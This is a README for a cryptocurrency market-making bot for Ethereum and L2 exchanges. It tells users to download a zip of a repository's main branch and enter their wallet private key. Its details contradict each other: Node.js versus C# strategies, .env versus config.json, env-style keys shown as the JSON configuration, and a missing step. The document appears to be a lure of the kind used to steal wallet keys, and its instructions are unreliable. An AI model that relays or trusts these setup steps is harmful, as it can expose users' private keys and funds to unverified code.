## Overview
This project is a Market Maker Bot designed to automate liquidity provision on decentralized exchanges (DEXs) operating on the Ethereum network and its Layer 2 (L2) solutions. The bot dynamically manages liquidity positions in various trading pairs, optimizing for profitability while minimizing risk exposure.

## Features
- **Automated Liquidity Provision**: Automatically provides liquidity in selected trading pairs on DEXs to earn fees.
- **Dynamic Position Management**: Monitors and rebalances liquidity positions based on market conditions.
- **Gas Optimization**: Uses gas-efficient techniques to minimize transaction costs, especially on Ethereum L1.
- **Compatibility with L2**: Supports Layer 2 networks (e.g., Arbitrum, Optimism) for reduced transaction costs and faster execution times.
- **Customizable Strategies**: Allows users to define and implement custom strategies tailored to their risk tolerance and profitability goals.
- **Risk Management**: Incorporates risk controls such as stop-loss mechanisms and impermanent loss protection.

## Requirements
- **Node.JS**: Ensure you have the latest version of the Node.JS installed to run the bot.
- **Ethereum Wallet**: MetaMask or other compatible Ethereum wallet for bot interaction.
- **API Keys**: Access to Ethereum node (e.g., Infura, Alchemy) for network interaction and real-time data.

## Installation
1. Clone the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/archive/refs/heads/main.zip).
2. Extract the archive.
3. Navigate to the extracted folder and edit `.env` config.
5. Start bot.
```
node index.js
```

## Configuration
Open the config.json file located in the root directory.
Fill in the required fields:
- rpc: Your Ethereum node RPC URL (e.g., from Infura, Alchemy)
- privateKey: Private key for the Ethereum wallet you will use
- dexAddress: Address of the decentralized exchange you want to provide liquidity on
- l2Network: Specify the L2 network (if applicable, e.g., Arbitrum, Optimism)

Example configuration:
```
RPC=https://mainnet.infura.io/v3/YOUR_API_KEY
PRIVATEKEY=YOUR_PRIVATE_KEY
DEXADDRESS=0xDEXADDRESS
L2NETWORK=ARB
```

## Supported Networks
- Ethereum (L1)
- Arbitrum (L2)
- Optimism (L2)
- Polygon (L2)

## Strategies
This bot includes several built-in strategies:
- Passive Liquidity Provision: Provides liquidity without frequent rebalancing.
- Active Market Making: Actively monitors and adjusts liquidity positions based on market price movements.
- Custom Strategies: Users can implement their own strategies by extending the botâ€™s core functionality in C#.
